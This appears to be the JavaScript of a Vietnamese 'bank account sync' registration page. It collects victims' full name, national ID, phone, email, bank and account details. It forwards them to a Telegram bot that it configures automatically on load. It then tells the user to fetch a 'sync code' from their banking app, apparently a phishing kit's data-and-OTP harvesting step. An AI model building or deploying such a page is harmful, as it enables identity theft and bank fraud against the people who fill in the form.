// Hiển thị thông báo
function showNotification(message, type = 'success') {
    const notification = document.getElementById('notification');
    notification.textContent = message;
    notification.className = `notification ${type} show`;
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// Tạo mã đồng bộ ngẫu nhiên (8 ký tự: chữ và số)
function generateSyncCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Hiển thị modal thông báo mã đồng bộ
function showSyncCodeModal(syncCode, bankName) {
    // Tạo modal element
    const modal = document.createElement('div');
    modal.className = 'sync-code-modal';
    modal.innerHTML = `
        <div class="sync-code-modal-overlay"></div>
        <div class="sync-code-modal-content">
            <div class="sync-code-modal-header">
                <h3>Mã Đồng Bộ Liên Kết</h3>
                <button class="sync-code-modal-close" onclick="this.closest('.sync-code-modal').remove()">×</button>
            </div>
            <div class="sync-code-modal-body">
                <div class="sync-code-icon">🔐</div>
                <p class="sync-code-message">
                    Mã đồng bộ liên kết đã được gửi về ứng dụng ngân hàng <strong>${bankName}</strong> đã đăng ký.
                </p>
                <p class="sync-code-instruction">
                    Vui lòng truy cập vào ứng dụng ngân hàng để thực hiện lấy mã đồng bộ. Mã đồng bộ sẽ được hiển thị trong ứng dụng ngân hàng của bạn.
                </p>
                <div class="sync-code-actions">
                    <button class="btn btn-primary" onclick="this.closest('.sync-code-modal').remove(); window.location.href='index.html';">Đã hiểu</button>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
}

// Sao chép mã đồng bộ
function copySyncCode(code) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(code).then(() => {
            const btn = document.querySelector('.btn-copy-code');
            if (btn) {
                const originalText = btn.textContent;
                btn.textContent = 'Đã sao chép!';
                btn.style.background = '#28a745';
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '';
                }, 2000);
            }
        }).catch(() => {
            // Fallback: sử dụng phương pháp cũ
            fallbackCopyTextToClipboard(code);
        });
    } else {
        // Fallback cho trình duyệt không hỗ trợ clipboard API
        fallbackCopyTextToClipboard(code);
    }
}

// Phương pháp sao chép dự phòng
function fallbackCopyTextToClipboard(text) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            const btn = document.querySelector('.btn-copy-code');
            if (btn) {
                const originalText = btn.textContent;
                btn.textContent = 'Đã sao chép!';
                btn.style.background = '#28a745';
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '';
                }, 2000);
            }
        } else {
            showNotification('Không thể sao chép mã. Vui lòng ghi lại mã thủ công.', 'error');
        }
    } catch (err) {
        showNotification('Không thể sao chép mã. Vui lòng ghi lại mã thủ công.', 'error');
    }
    document.body.removeChild(textArea);
}

// Đặt hàm vào window để có thể gọi từ onclick
window.copySyncCode = copySyncCode;

// Lưu thông tin đăng ký liên kết vào localStorage
function saveBankSyncRegistration(data, syncCode) {
    const registrations = getBankSyncRegistrations();
    const newRegistration = {
        id: Date.now().toString(),
        ...data,
        syncCode: syncCode,
        createdAt: new Date().toISOString(),
        status: 'pending' // pending, approved, rejected
    };
    registrations.push(newRegistration);
    localStorage.setItem('bankSyncRegistrations', JSON.stringify(registrations));
    
    // Gửi thông báo qua Telegram Bot API
    if (window.TelegramBot) {
        // Kiểm tra đã cấu hình chưa, nếu chưa thì tự động cấu hình
        if (!window.TelegramBot.isTelegramConfigured()) {
            if (window.TelegramBot.autoSetupTelegram) {
                console.log('🔧 Tự động cấu hình Telegram Bot...');
                window.TelegramBot.autoSetupTelegram();
            }
        }
        
        // Gửi thông báo
        if (window.TelegramBot.notifyNewBankSync) {
            window.TelegramBot.notifyNewBankSync(data, syncCode)
                .then(result => {
                    if (result && result.success) {
                        console.log('✅ Đã gửi thông báo Telegram liên kết ngân hàng thành công');
                    } else {
                        console.warn('⚠️ Gửi thông báo Telegram không thành công:', result?.error);
                    }
                })
                .catch(err => {
                    console.error('❌ Lỗi khi gửi thông báo Telegram:', err);
                });
        }
    }
    
    return newRegistration;
}

// Lấy danh sách đăng ký liên kết
function getBankSyncRegistrations() {
    const registrations = localStorage.getItem('bankSyncRegistrations');
    return registrations ? JSON.parse(registrations) : [];
}

// Xử lý submit form đăng ký liên kết
document.addEventListener('DOMContentLoaded', function() {
    // Đảm bảo Telegram Bot đã được cấu hình khi trang load
    if (window.TelegramBot) {
        if (!window.TelegramBot.isTelegramConfigured()) {
            if (window.TelegramBot.autoSetupTelegram) {
                console.log('🔧 Tự động cấu hình Telegram Bot khi trang load...');
                window.TelegramBot.autoSetupTelegram();
            }
        } else {
            console.log('✅ Telegram Bot đã được cấu hình');
            const testMode = window.TelegramBot.isTestMode();
            if (testMode) {
                console.log('🧪 Chế độ Test: BẬT (không gửi thông báo thật)');
            } else {
                console.log('📤 Chế độ Test: TẮT (sẽ gửi thông báo thật)');
            }
        }
    }
    
    const bankSyncForm = document.getElementById('bankSyncForm');
    if (!bankSyncForm) return;
    
    bankSyncForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        
        const syncData = {
            fullName: formData.get('syncFullName').trim(),
            idNumber: formData.get('syncIdNumber').trim(),
            phone: formData.get('syncPhone').trim(),
            email: formData.get('syncEmail').trim(),
            bankName: formData.get('bankName'),
            bankBranch: formData.get('bankBranch').trim(),
            accountNumber: formData.get('accountNumber').trim(),
            accountHolderName: formData.get('accountHolderName').trim(),
            notes: formData.get('syncNotes').trim()
        };
        
        // Kiểm tra checkbox đồng ý
        if (!formData.get('syncAgreement')) {
            showNotification('Vui lòng đồng ý với các điều khoản và điều kiện!', 'error');
            return;
        }
        
        // Tạo mã đồng bộ
        const syncCode = generateSyncCode();
        
        // Lưu thông tin đăng ký kèm mã đồng bộ
        const newRegistration = saveBankSyncRegistration(syncData, syncCode);
        
        // Lấy tên ngân hàng để hiển thị
        const bankSelect = document.getElementById('bankName');
        const bankName = bankSelect ? bankSelect.options[bankSelect.selectedIndex].text : syncData.bankName;
        
        // Hiển thị modal với mã đồng bộ
        showSyncCodeModal(syncCode, bankName);
        
        // Hiển thị thông báo thành công
        let notificationMessage = 'Đăng ký liên kết ngân hàng thành công!';
        
        // Kiểm tra xem có gửi thông báo Telegram không
        if (window.TelegramBot && window.TelegramBot.isTelegramConfigured()) {
            const testMode = window.TelegramBot.isTestMode();
            if (testMode) {
                notificationMessage += ' (Thông báo Telegram: Chế độ Test)';
            } else {
                notificationMessage += ' (Đã gửi thông báo qua Telegram)';
            }
        }
        
        showNotification(notificationMessage, 'success');
    });
});

